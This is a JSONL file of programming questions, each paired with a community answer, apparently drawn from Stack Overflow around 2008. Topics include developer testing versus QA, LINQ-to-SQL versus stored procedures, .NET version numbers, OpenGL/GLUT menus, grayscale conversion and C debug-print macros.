{"instruction": "While trying to advocate more developer testing, I find the argument \"Isn't that QA's job?\" is used a lot.  In my mind, it doesn't make sense to give the QA team all testing responsibilities, but at the same time Spolsky and others say you shouldn't be using the $100/hr developers to do something a $30/hr tester could be doing.  What are the experiences of others in a company with a dedicated QA team?  Where should the division of work be drawn?\nClarification: I meant QA as a validation and verification team. Devs should not be doing the validation (customer-focused testing), but where is the verification (functional testing) division point?", "output": "I have only been in the industry for a year, but in my experience dev's are responsible for unit testing their features, while QA is responsible for testing scenarios.  QA would also be expected to test any boundry conditions."}
{"instruction": "While trying to advocate more developer testing, I find the argument \"Isn't that QA's job?\" is used a lot.  In my mind, it doesn't make sense to give the QA team all testing responsibilities, but at the same time Spolsky and others say you shouldn't be using the $100/hr developers to do something a $30/hr tester could be doing.  What are the experiences of others in a company with a dedicated QA team?  Where should the division of work be drawn?\nClarification: I meant QA as a validation and verification team. Devs should not be doing the validation (customer-focused testing), but where is the verification (functional testing) division point?", "output": "Here are some ways that developer testing is the most efficient / highest payoff:\n\nDeveloper modifies a shared library while working on a feature - dev has insight into possible side effects that QA / validation don't\nDeveloper is unsure of performance of library call and writes a unit test\nDeveloper discovers path of use case not considered in spec that code must support, writes code, updates spec, writes test\n\nIt's arguable how much test duty should be carried out by the dev in the third example, but I argue that it's most efficient for the dev because all of the related minutiae from many layers of documentation and code are already in her short-term memory. This perfect storm may not be attainable by a tester after the fact.\nAre we talking about QA or validation? I think of QA along the lines of inspection checklists, code standards enforcement, UI guidelines, etc. If we're talking validation, it doesn't make sense for devs to spend a lot of time authoring and executing formal test cases, but devs must provide all of the rationale and design documentation needed to author good tests."}
{"instruction": "While trying to advocate more developer testing, I find the argument \"Isn't that QA's job?\" is used a lot.  In my mind, it doesn't make sense to give the QA team all testing responsibilities, but at the same time Spolsky and others say you shouldn't be using the $100/hr developers to do something a $30/hr tester could be doing.  What are the experiences of others in a company with a dedicated QA team?  Where should the division of work be drawn?\nClarification: I meant QA as a validation and verification team. Devs should not be doing the validation (customer-focused testing), but where is the verification (functional testing) division point?", "output": "It's the difference between \"black box\" testing (where you know what the code is supposed to do, but not how it works), and \"white box\" testing (where knowing how it works drives how you test it). \"Black box\" testing is what most people think of when you mention Quality Assurance.\nI work for a company where the QA team are also software developers.  (That narrows the field a lot if you care to guess the company.)  I know Joel's opinion, and my experience leads me to partially disagree: for the same reason that a \"white hat\" hacker is more effective finding security holes, certain kinds of errors are more effectively found by white box testers who know how to write code (and therefore what the common mistakes are - for example, resource management issues like memory leaks).  \nAlso, since QA-oriented developers are part of the process from the initial design phase, they can theoretically help to drive higher-quality code throughout the process.  Ideally, for each developer working on the project with a mental focus on functionality, you have an opposing developer with a mental focus on breaking the code (and thus making it better).  \nSeen in that light, it's less a matter of using developers for testers than it is kind of disconnected pair-programming where one developer has an emphasis on controlling quality.  \nOn the other hand, a lot of testing (such as basic UI functionality) frankly doesn't need that kind of skill.  That's where Joel has a point. \nFor many businesses, I could see a system where programming teams trade off code review and testing duties for each others' code.  Members of the Business Logic team, for example, could spend an occasional tour testing and reviewing code for the UI team, and vice-versa.  That way you're not \"wasting\" developer talent on full-time testing, but you are gaining the advantages of exposing the code to (hopefully) expert scrutiny and punishment.  Then, a more traditional QA team can take up the \"black box\" testing."}
{"instruction": "I need to learn ADO.NET to build applications based on MS Office. I have read a good deal about ADO.NET in the MSDN Library, but everything seems rather messy to me.\nWhat are the basics one must figure out when using ADO.NET? I think a few key words will suffice to let me organize my learning.", "output": "Another way of getting a command object is to call connection.CreateCommand(). \nThat way you shouldn't have to set the Connection property on the command object."}
{"instruction": "While trying to advocate more developer testing, I find the argument \"Isn't that QA's job?\" is used a lot.  In my mind, it doesn't make sense to give the QA team all testing responsibilities, but at the same time Spolsky and others say you shouldn't be using the $100/hr developers to do something a $30/hr tester could be doing.  What are the experiences of others in a company with a dedicated QA team?  Where should the division of work be drawn?\nClarification: I meant QA as a validation and verification team. Devs should not be doing the validation (customer-focused testing), but where is the verification (functional testing) division point?", "output": "I'm pasting my answer to a question on our internal forum. If you have an hour or so.. take a listen to Mary Poppendieck's Competing on the basis of Speed video. Recommended\nNote(By Testers - I refer to the QA Team)\nDeveloper / Unit tests _=__ Usability testing & Exploratory testing\n'==================================================================\nAcceptance / Customer tests =__ Property testing\nImagine that to be a square with four quadrants. :)\nThe left half should be automated.\n\nDeveloper tests verify that the code works as the coder wanted it to.\n  Tools: NUnit / xUnit / whatever home-made tool\nCustomer tests verify that the code works as the customer wanted it to.\nThe tests should be very easy to write, shouldn't require the customer to learn .NET/Java. Else the customer wont write those tests (although he may require some help of a developer). Fit for example uses HTML tables that can be written in Word.\nTools: FIT\nRegression tools also lie here. Record-replay.\n\nThe right half better utilizes the time & effort of good testers. e.g. No automated test can tell you whether X dialog is usable. Humans are better at this than machines.\n\nUsability. Try to Break the System down,( catch unhandled failure scenarios, enter null values ). Basically catch things that the developer missed.\nProperty testing again requires humans. Here you check customer mandated properties that are required by your system. e.g. Performance - does your search dialog meet the 2 sec response time ? Security- can someone hack into this System ? etc. Availability - is your system online 99.99% of the time ?\n\nTesters shouldn't be spending time executing test-plans on the left half. That is the developers responsibility to ensure that the code works as the customer and the developer intended it to. The testers can infact help the customer formulate the acceptance tests.."}
{"instruction": "I'm having problems using textures that are larger than the OpenGL window or the display size as non-display render targets.\nWhat's the solution for this problem?", "output": "There's a simple solution.\nAssuming your (non-display) textures are 1024x1024 and you are restricted to a 256x256 window/display.\nunsigned int WIN_WIDTH = 256;\nunsigned int WIN_HEIGHT = WIN_WIDTH;\nunsigned int TEX_WIDTH = 1024;\nunsigned int TEX_HEIGHT = TEX_WIDTH;\n\nUse the window size to create your OpenGL window:\nglutInitWindowSize(WIN_WIDTH, WIN_HEIGHT);\n\nBut, use the texture size for everything else:\nglViewport(0, 0, TEX_WIDTH, TEX_HEIGHT);\ngluOrtho2D(0.0, TEX_WIDTH, 0.0, TEX_HEIGHT);\nglTexCoord2i(TEX_WIDTH, TEX_HEIGHT);"}
{"instruction": "For example; with the old command prompt it would be:\ncmd.exe /k mybatchfile.bat", "output": "Drop into a cmd instance (or indeed PowerShell itself) and type this:\npowershell -?\n\nYou'll see that powershell.exe has a \"-noexit\" parameter which tells it not to exit after executing a \"startup command\"."}
{"instruction": "How do I convert the RGB values of a pixel to a single monochrome value?", "output": "I found one possible solution in the Color FAQ. The luminance component Y (from the CIE XYZ system) captures what is most perceived by humans as color in one channel. So, use those coefficients:\nmono = (0.2125 * color.r) + (0.7154 * color.g) + (0.0721 * color.b);"}
{"instruction": "How do I convert the RGB values of a pixel to a single monochrome value?", "output": "This MSDN article uses (0.299 * color.R + 0.587 * color.G + 0.114 * color.B);\nThis Wikipedia article uses (0.3* color.R + 0.59 * color.G + 0.11 * color.B);"}
{"instruction": "Is it easy to create GLUT pop-up menus for my OpenGL application? If yes, how?", "output": "Creating and using pop-up menus with GLUT is very simple. Here is a code sample that creates a pop-up menu with 4 options:\n// Menu items\nenum MENU_TYPE\n{\n        MENU_FRONT,\n        MENU_SPOT,\n        MENU_BACK,\n        MENU_BACK_FRONT,\n};\n\n// Assign a default value\nMENU_TYPE show = MENU_BACK_FRONT;\n\n// Menu handling function declaration\nvoid menu(int);\n\nint main()\n{\n        // ...\n\n        // Create a menu\n        glutCreateMenu(menu);\n\n        // Add menu items\n        glutAddMenuEntry(\"Show Front\", MENU_FRONT);\n        glutAddMenuEntry(\"Show Back\", MENU_BACK);\n        glutAddMenuEntry(\"Spotlight\", MENU_SPOT);\n        glutAddMenuEntry(\"Blend 'em all\", MENU_BACK_FRONT);\n\n        // Associate a mouse button with menu\n        glutAttachMenu(GLUT_RIGHT_BUTTON);\n\n        // ...\n\n        return;\n}\n\n// Menu handling function definition\nvoid menu(int item)\n{\n        switch (item)\n        {\n        case MENU_FRONT:\n        case MENU_SPOT:\n        case MENU_DEPTH:\n        case MENU_BACK:\n        case MENU_BACK_FRONT:\n                {\n                        show = (MENU_TYPE) item;\n                }\n                break;\n        default:\n                {       /* Nothing */       }\n                break;\n        }\n\n        glutPostRedisplay();\n\n        return;\n}"}
{"instruction": "I have a Flex swf hosted at http://www.a.com/a.swf.\nI have a flash code on another doamin that tries loading the SWF:\n_loader = new Loader();\nvar req:URLRequest = new URLRequest(\"http://services.nuconomy.com/n.swf\");\n_loader.contentLoaderInfo.addEventListener(Event.COMPLETE,onLoaderFinish);\n_loader.load(req);\n\nOn the onLoaderFinish event I try to load classes from the remote SWF and create them:\n_loader.contentLoaderInfo.applicationDomain.getDefinition(\"someClassName\") as Class\n\nWhen this code runs I get the following exception\nSecurityError: Error #2119: Security sandbox violation: caller http://localhost.service:1234/flashTest/Main.swf cannot access LoaderInfo.applicationDomain owned by http://www.b.com/b.swf.\n    at flash.display::LoaderInfo/get applicationDomain()\n    at NuconomyLoader/onLoaderFinish()\n\nIs there any way to get this code working?", "output": "Mayhaps System.Security.allowDomain is what you need?"}
{"instruction": "I have a Flex swf hosted at http://www.a.com/a.swf.\nI have a flash code on another doamin that tries loading the SWF:\n_loader = new Loader();\nvar req:URLRequest = new URLRequest(\"http://services.nuconomy.com/n.swf\");\n_loader.contentLoaderInfo.addEventListener(Event.COMPLETE,onLoaderFinish);\n_loader.load(req);\n\nOn the onLoaderFinish event I try to load classes from the remote SWF and create them:\n_loader.contentLoaderInfo.applicationDomain.getDefinition(\"someClassName\") as Class\n\nWhen this code runs I get the following exception\nSecurityError: Error #2119: Security sandbox violation: caller http://localhost.service:1234/flashTest/Main.swf cannot access LoaderInfo.applicationDomain owned by http://www.b.com/b.swf.\n    at flash.display::LoaderInfo/get applicationDomain()\n    at NuconomyLoader/onLoaderFinish()\n\nIs there any way to get this code working?", "output": "This is all described in The Adobe Flex 3 Programming ActionScript 3 PDF on page 550 (Chapter 27: Flash Player Security / Cross-scripting):\n\nIf two SWF files written with ActionScript 3.0 are served from different domains\u2014for example, http://siteA.com/swfA.swf and http://siteB.com/swfB.swf\u2014then, by default, Flash Player does not allow swfA.swf to script swfB.swf, nor swfB.swf to script swfA.swf. A SWF file gives permission to SWF files from other domains by calling Security.allowDomain(). By calling Security.allowDomain(\"siteA.com\"), swfB.swf gives SWF files from siteA.com permission to script it.\n\nIt goes on in some more detail, with diagrams and all."}
{"instruction": "I have a Flex swf hosted at http://www.a.com/a.swf.\nI have a flash code on another doamin that tries loading the SWF:\n_loader = new Loader();\nvar req:URLRequest = new URLRequest(\"http://services.nuconomy.com/n.swf\");\n_loader.contentLoaderInfo.addEventListener(Event.COMPLETE,onLoaderFinish);\n_loader.load(req);\n\nOn the onLoaderFinish event I try to load classes from the remote SWF and create them:\n_loader.contentLoaderInfo.applicationDomain.getDefinition(\"someClassName\") as Class\n\nWhen this code runs I get the following exception\nSecurityError: Error #2119: Security sandbox violation: caller http://localhost.service:1234/flashTest/Main.swf cannot access LoaderInfo.applicationDomain owned by http://www.b.com/b.swf.\n    at flash.display::LoaderInfo/get applicationDomain()\n    at NuconomyLoader/onLoaderFinish()\n\nIs there any way to get this code working?", "output": "You'll need a crossdomain.xml policy file on the server that has the file you load, it should look a something like this:\n<?xml version=\"1.0\"?>\n<!-- <http://www.foo.com/crossdomain.xml> -->\n<cross-domain-policy>\n  <allow-access-from domain=\"www.friendOfFoo.com\" />\n  <allow-access-from domain=\"*.foo.com\" />\n  <allow-access-from domain=\"105.216.0.40\" />\n</cross-domain-policy>\n\nPut it as crossdomain.xml in the root of the domain you're loading from.\nAlso you need to set the loader to read this file as such:\nvar loaderContext:LoaderContext = new LoaderContext();\nloaderContext.checkPolicyFile = true;\n\nvar loader:Loader = new Loader();\nloader.contentLoaderInfo.addEventListener( Event.COMPLETE, onComplete );\nloader.load( new URLRequest( \"http://my.domain.com/image.png\" ), loaderContext );\n\ncode sample yoinked from http://blog.log2e.com/2008/08/15/when-a-cross-domain-policy-file-is-not-enough/"}
{"instruction": "Pretty much every other editor that isn't a vi descendant (vim, cream, vi-emu) seems to use the emacs shortcuts (ctrl+w to delete back a word and so on)", "output": "Um... maybe there isn't much of a need for one, given that Vi/Vim is pretty much available everywhere and got the whole modal thing right? :)"}
{"instruction": "Pretty much every other editor that isn't a vi descendant (vim, cream, vi-emu) seems to use the emacs shortcuts (ctrl+w to delete back a word and so on)", "output": "I believe Eclipse has Vi bindings and there is a Visual Studio plugin/extension, too (which is called Vi-Emu, or something)."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "Don't forget Microsoft's solution to the problem: Visual Studio 2008 Database Edition.  Includes tools for deploying changes to databases, producing a diff between databases for schema and/or data changes, unit tests, test data generation.\nIt's pretty expensive but I used the trial edition for a while and thought it was brilliant.  It makes the database as easy to work with as any other piece of code."}
{"instruction": "Pretty much every other editor that isn't a vi descendant (vim, cream, vi-emu) seems to use the emacs shortcuts (ctrl+w to delete back a word and so on)", "output": "Early software was often modal, but usability took a turn at some point, away from this style. \nVI-based editors are total enigmas -- they're the only real surviving members of that order of software. \nModes are a no-no in usability and interaction design because we humans are fickle mammals who cannot be trusted to remember what mode the application is in. \nIf you think you are in one \"mode\" when you are actually in another, then all sorts of badness can ensue. What you believe to be a series of harmless keystrokes can (in the wrong mode) cause unlimited catastrophe. This is known as a \"mode error\".\nTo learn more, search for the term \"modeless\" (and \"usability\")\nAs mentioned in the comments below, a Modal interface in the hands of an experienced and non-fickle person can be extremely efficient."}
{"instruction": "Pretty much every other editor that isn't a vi descendant (vim, cream, vi-emu) seems to use the emacs shortcuts (ctrl+w to delete back a word and so on)", "output": "Though not really answering your question, there used to be a \"modal like\" way to write Japanese on cell phones before :\nThe first letter you hit was a conson let's say K, and then, and then the next key you would hit would have the role of a conson. (Having two conson in a row is impossible in Japanese)\nThough it was main a few years ago, today it's only used by people who really want to hit fast."}
{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "Linq to Sql.\nSql server will cache the query plans, so there's no performance gain for sprocs.\nYour linq statements, on the other hand, will be logically part of and tested with your application.  Sprocs are always a bit separated and are harder to maintain and test.\nIf I was working on a new application from scratch right now I would just use Linq, no sprocs."}
{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "I'm assuming you mean Linq To Sql\nFor any CRUD command it's easy to profile the performance of a stored procedure vs. any technology. In this case any difference between the two will be negligible. Try profiling for a 5 (simple types) field object over 100,000 select queries to find out if there's a real difference.\nOn the other hand the real deal-breaker will be the question on whether you feel comfortable putting your business logic on your database or not, which is an argument against stored procedures."}
{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "The best code is no code, and with stored procedures you have to write at least some code in the database and code in the application to call it , whereas with LINQ to SQL or LINQ to Entities, you don't have to write any additional code beyond any other LINQ query aside from instantiating a context object."}
{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "I am generally a proponent of putting everything in stored procedures, for all of the reasons DBAs have been harping on for years.  In the case of Linq, it is true that there will be no performance difference with simple CRUD queries.\nBut keep a few things in mind when making this decision: using any ORM couples you tightly to your data model.  A DBA has no freedom to make changes to the data model without forcing you to change your compiled code.  With stored procedures, you can hide these sorts of changes to an extent, since the parameter list and results set(s) returned from a procedure represent its contract, and the innards can be changed around, just so long as that contract is still met.\nAnd also, if Linq is used for more complex queries, tuning the database becomes a much more difficult task.  When a stored procedure is running slow, the DBA can totally focus on the code in isolation, and has lots of options, just so that contract is still satisfied when he/she is done.\nI have seen many, many cases where serious problems in an application were addressed by changes to the schema and code in stored procedures without any change to deployed, compiled code.\nPerhaps a hybird approach would be nice with Linq?  Linq can, of course, be used to call stored procedures."}
{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "For basic data retrieval I would be going for Linq without hesitation.\nSince moving to Linq I've found the following advantages:\n\nDebugging my DAL has never been easier.\nCompile time safety when your schema changes is priceless.\nDeployment is easier because everything is compiled into DLL's. No more managing deployment scripts.\nBecause Linq can support querying anything that implements the IQueryable interface, you will be able to use the same syntax to query XML, Objects and any other datasource without having to learn a new syntax"}
{"instruction": "I don't know when to add to a dataset a tableadapter or a query from toolbox. Does it make any difference?\nI also dont know where to create instances of the adapters. \n\nShould I do it in the Page_Load? \nShould I just do it when I'm going to use it?  \nAm I opening a new connection when I create a new instance?\n\nThis doesn't seem very important, but every time I create a query a little voice on my brain asks me these questions.", "output": "Should I just do it when I'm going to use it?\n\nI would recommend that you only retrieve the data when you are going to use it. If you are not going to need it, there is no reason to waste resources by retrieving it in Page_Load. If you are going to need it multiple times throughout the page load, consider saving the query results to a private variable or collection so that the same data can be reused multiple times throughout the page load.\n\nAm I opening a new connection when I create a new instance?\n\nAsp.net handles connection pooling, and opens and closes connections in an efficient way. You shouldn't have to worry about this.\nOne other thing to consider from a performance perspective is to avoid using Datasets and TableAdapters. In many cases, they add extra overhead into data retrieval that does not exist when using Linq to Sql, Stored Procedures or DataReaders."}
{"instruction": "I have a large database of normalized order data that is becoming very slow to query for reporting.  Many of the queries that I use in reports join five or six tables and are having to examine tens or hundreds of thousands of lines.\nThere are lots of queries and most have been optimized as much as possible to reduce server load and increase speed.  I think it's time to start keeping a copy of the data in a denormalized format.\nAny ideas on an approach?  Should I start with a couple of my worst queries and go from there?", "output": "For MySQL I like this talk: Real World Web: Performance & Scalability, MySQL Edition. This contains a lot of different pieces of advice for getting more speed out of MySQL."}
{"instruction": "In .NET there are two version numbers available when building a project, File Version and Assembly Version. How are you using these numbers?  Keeping them the same?  Auto-incrementing one, but manually changing the other?\nAlso what about the AssemblyInformationalVersion attribute?\nI'd found this support Microsoft Knowledge Base (KB) article that provided some help:  How to use Assembly Version and Assembly File Version.", "output": "I keep them the same. But then, I don't have multifile assemblies, which is when the AssemblyVersion number becomes important. I use Microsoft-style date encoding for my build numbers, rather than auto-incrementing (I don't find the number of times that something has been built to be all that important)."}
{"instruction": "In .NET there are two version numbers available when building a project, File Version and Assembly Version. How are you using these numbers?  Keeping them the same?  Auto-incrementing one, but manually changing the other?\nAlso what about the AssemblyInformationalVersion attribute?\nI'd found this support Microsoft Knowledge Base (KB) article that provided some help:  How to use Assembly Version and Assembly File Version.", "output": "In a scenario where I have multiple file assemblies (i.e. 1 exe and 5 dlls) I will use a different file version for each, but the same assembly version for all of them, allowing you to know which exe each of the dlls go with."}
{"instruction": "I've been doing ASP.NET development for a little while now, and I've used both the GridView and the DataGrid controls before for various things, but I never could find a really good reason to use one or the other. I'd like to know:\nWhat is the difference between these 2 ASP.NET controls? What are the advantages or disadvantages of both? Is one any faster? Newer? Easier to maintain?\nThe intellisense summary for the controls doesn't seem to describe any difference between the two. They both can view, edit, and sort data and automatically generate columns at runtime.\nEdit: Visual Studio 2008 no longer lists DataGrid as an available control in the toolbox. It is still available (for legacy support I assume) if you type it in by hand though.", "output": "The key difference is in the ViewState management IIRC. The DataGrid requires ViewState turned on in order to have edit and sort capabilities."}
{"instruction": "I've been doing ASP.NET development for a little while now, and I've used both the GridView and the DataGrid controls before for various things, but I never could find a really good reason to use one or the other. I'd like to know:\nWhat is the difference between these 2 ASP.NET controls? What are the advantages or disadvantages of both? Is one any faster? Newer? Easier to maintain?\nThe intellisense summary for the controls doesn't seem to describe any difference between the two. They both can view, edit, and sort data and automatically generate columns at runtime.\nEdit: Visual Studio 2008 no longer lists DataGrid as an available control in the toolbox. It is still available (for legacy support I assume) if you type it in by hand though.", "output": "If you're working in Visual Studio 2008 / .NET 3.5, you probably shouldn't use either. Use the ListView - it gives you the features of the GridView combined with the styling flexibility of a repeater."}
{"instruction": "In .NET there are two version numbers available when building a project, File Version and Assembly Version. How are you using these numbers?  Keeping them the same?  Auto-incrementing one, but manually changing the other?\nAlso what about the AssemblyInformationalVersion attribute?\nI'd found this support Microsoft Knowledge Base (KB) article that provided some help:  How to use Assembly Version and Assembly File Version.", "output": "@Adam: Are you changing the file version with each build?  Are you using version control (SYN or VSS) and using that information to link source back to the binaries?\nSeems to make sense that the Assembly version stays the same. i.e. \"2.0.0.0\".  That corresponds to the deployment of the product.\nThe file version changes to match the revision from the source control.  \"2.0.??.revision\"  This would provide a link from a specific dll (or exe) to the source that built it."}
{"instruction": "In .NET there are two version numbers available when building a project, File Version and Assembly Version. How are you using these numbers?  Keeping them the same?  Auto-incrementing one, but manually changing the other?\nAlso what about the AssemblyInformationalVersion attribute?\nI'd found this support Microsoft Knowledge Base (KB) article that provided some help:  How to use Assembly Version and Assembly File Version.", "output": "In solutions with multiple projects, one thing I've found very helpful is to have all the AssemblyInfo files point to a single project that governs the versioning. So my AssemblyInfos have a line:\n[assembly: AssemblyVersion(Foo.StaticVersion.Bar)]\n\nI have a project with a single file that declares the string:\nnamespace Foo\n{\n    public static class StaticVersion\n    {\n         public const string Bar= \"3.0.216.0\"; // 08/01/2008 17:28:35\n    }\n}\n\nMy automated build process then just changes that string by pulling the most recent version from the database and incrementing the second last number.\nI only change the Major build number when the featureset changes dramatically.\nI don't change the file version at all."}
{"instruction": "I've been tasked with redesigning part of a ms-sql database structure which currently involves a lot of views, some of which contain joins to other views. \nAnyway, I wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structure.\nWhat's the best program you've used for such problems?", "output": "I upmodded Mark's post about Toad Data Modeler and wanted to point out that they have a beta version that is fully functional and free. The only downsides are the occasional bug and built in expiration (typically around the time a new beta is available), but for this poor bloke it does wonders until I can get my boss to chip in for a license."}
{"instruction": "In .NET there are two version numbers available when building a project, File Version and Assembly Version. How are you using these numbers?  Keeping them the same?  Auto-incrementing one, but manually changing the other?\nAlso what about the AssemblyInformationalVersion attribute?\nI'd found this support Microsoft Knowledge Base (KB) article that provided some help:  How to use Assembly Version and Assembly File Version.", "output": "The KB article mentions the most important distinction: File versions are only used for display purposes, whereas the assembly version plays an important part in the .NET loading behaviour.\nIf you change the assembly version number, then the identity of your assembly as a whole has changed. Developers will need to rebuild to reference your new version (unless you put some auto-versioning \"policy\" in place) and at runtime only assemblies with matching version numbers will be loaded.\nThis is important in my environment, where we need an incrementing, highly visible version number for audit purposes, but we don't want to force developers to rebuild or have many versions concurrently in production. In this case for backwardly-compatible minor changes we update the file version, but not the assembly version."}
{"instruction": "I am using xampp on Windows, but I would like to use something closer to my server setup.\nFederico Cargnelutti tutorial explains how to setup LAMP VMWARE appliance; it is a great introduction to VMware appliances, but one of the commands was not working and it doesn't describe how to change the keyboard layout and the timezone.\nps: the commands are easy to find but I don't want to look for them each time I reinstall the server. I am using this question as a reminder.", "output": "Assuming you have VMware workstation, VMware player or anything that can run vmware appliance, you just need to:\n\nDownload, unzip Ubuntu 8.04 Server and start the virtual machine.\nUpdate ubuntu and set the layout and the timezone:\n\nsudo apt-get update\nsudo apt-get upgrade\nsudo dpkg-reconfigure console-setup\nsudo dpkg-reconfigure tzdata\nsudo vim /etc/network/interfaces\n\nset a fixed IP (Optional). \ninstall apache+mysql+php:\nsudo tasksel install lamp-server"}
{"instruction": "I am using xampp on Windows, but I would like to use something closer to my server setup.\nFederico Cargnelutti tutorial explains how to setup LAMP VMWARE appliance; it is a great introduction to VMware appliances, but one of the commands was not working and it doesn't describe how to change the keyboard layout and the timezone.\nps: the commands are easy to find but I don't want to look for them each time I reinstall the server. I am using this question as a reminder.", "output": "I don't really understand your question because i really didn't see one. But i'll do my best to infer two: to change your keyboard layout, check this forum post on ubuntu forums and to change the timezone, check this forum post."}
{"instruction": "How do I convert the RGB values of a pixel to a single monochrome value?", "output": "This depends on what your motivations are.  If you just want to turn an arbitrary image to grayscale and have it look pretty good, the conversions in other answers to this question will do.\nIf you are converting color photographs to black and white, the process can be both very complicated and subjective, requiring specific tweaking for each image.  For an idea what might be involved, take a look at this tutorial from Adobe for Photoshop.\nReplicating this in code would be fairly involved, and would still require user intervention to get the resulting image aesthetically \"perfect\" (whatever that means!)."}
{"instruction": "Does SQL Server 2008 ship with the .NET 3.5 CLR, so that stored procedures written in CLR can use 3.5 features?", "output": "I swear this isn't being pedantic, but is an important distinction -- I don't know what specifically you need when you say \".NET 3.5 CLR\" -- probably the .NET 3.5 Framework?  Possibly C# 3.0 language features?  But the CLR that .NET 3.5 runs on is still CLR 2.0.  (the link is to the same explanation re: .NET 3.0; I couldn't immediately find this info on 3.5.  Actually, the best explanation of CLR vs. Framework vs. language version numbers I've yet found is on page 12 of Teach Yourself WPF in 24 Hours*)\nSo, my point is that you can even use the features of .NET 3.5 and C# 3.0 on SQL 2005 CLR stored procedures -- we do, at my company -- and there's not even really any trickery to it.  All you have to do is have the free 3.5 framework on your server.  Obviously the SQL 2005 answer isn't that relevant for your specific question, but hopefully this will be helpful to the person who eventually comes across this page via Google.\n*disclosure: I'm friends with the authors"}
{"instruction": "I'm setting up a dedicated SQL Server 2005 box on Windows Server 2008 this week, and would like to pare it down to be as barebones as possible while still being fully functional.\nTo that end, the \"Server Core\" option sounds appealing, but I'm not clear about whether or not I can run SQL Server on that SKU.  Several services are addressed on the Microsoft website, but I don't see any indication about SQL Server.\nDoes anyone know definitively?", "output": "No. For some things you will need the .net Framework (like reporting services), and you can't install it (in a supported way) in a server core."}
{"instruction": "Pretty much every other editor that isn't a vi descendant (vim, cream, vi-emu) seems to use the emacs shortcuts (ctrl+w to delete back a word and so on)", "output": "@Leon: Great answer.\n@dbr: Modal editing is something that takes a while to get used to. If you were to build a new editor that fits this paradigm, how would you improve on VI/VIM/Emacs? I think that is, in part, an answer to the question. Getting it \"right\" is hard enough, competing agains the likes of VI/VIM/Emacs would be extremely tough -- most people who use these editors are \"die hard\" fans, and you'd have to give them a compelling reason to move to another editor. Those people who don't use them already are most likely going to stay in a non-modal editor. IMHO of course ;)"}
{"instruction": "I'd like to make a debug logging function with the same parameters as printf.  But one that can be removed by the pre-processor during optimized builds.\nFor example:\nDebug_Print(\"Warning: value %d > 3!\\n\", value);\n\nI've looked at variadic macros but those aren't available on all platforms. gcc supports them, msvc does not.", "output": "What platforms are they not available on? stdarg is part of the standard library:\nhttp://www.opengroup.org/onlinepubs/009695399/basedefs/stdarg.h.html\nAny platform not providing it is not a standard C implementation (or very, very old). For those, you will have to use varargs:\nhttp://opengroup.org/onlinepubs/007908775/xsh/varargs.h.html"}
{"instruction": "I'd like to make a debug logging function with the same parameters as printf.  But one that can be removed by the pre-processor during optimized builds.\nFor example:\nDebug_Print(\"Warning: value %d > 3!\\n\", value);\n\nI've looked at variadic macros but those aren't available on all platforms. gcc supports them, msvc does not.", "output": "Here's something that I do in C/C++. First off, you write a function that uses the varargs stuff (see the link in Stu's posting). Then do something like this:\n\n int debug_printf( const char *fmt, ... );\n #if defined( DEBUG )\n  #define DEBUG_PRINTF(x) debug_printf x\n #else\n   #define DEBUG_PRINTF(x)\n #endif\n\n DEBUG_PRINTF(( \"Format string that takes %s %s\\n\", \"any number\", \"of args\" ));\n\nAll you have to remember is to use double-parens when calling the debug function, and the whole line will get removed in non-DEBUG code."}
